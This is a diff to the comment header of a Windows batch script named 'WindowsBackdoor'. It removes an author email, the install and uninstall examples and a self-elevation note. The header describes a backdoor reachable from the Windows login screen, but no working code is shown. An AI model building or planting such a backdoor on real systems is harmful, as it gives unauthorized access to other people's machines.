@@ -4,7 +4,7 @@ call :InitDefaults
 
 %#cs%
 
-	Devil-Backdoor project is for informational purposes only You take full responsibility for using this software!
+	Backdoor project is for informational purposes only You take full responsibility for using this software!
 
 %#ce%
 
@@ -12,16 +12,10 @@ Title WindowsBackdoor v!ver!
 
 %#cs%
 
-	Author   : Kabue Murage dennisk@zainahtech.com
+	Author   : Kabue Murage
 	Forums   : 254peepee
 	Script   : Backdoor.bat
 	Function : Create a commandline backdoor accessible from the windows login screen to manipulate files and directories.
-	Examples :
-		- Backdoor.bat -install
-		- Backdoor.bat -uninstall
-
-
-	This will self elevate the script so with a UAC prompt since this script needs to be run as an Administrator in order to function properly.
 
 %#ce%
 
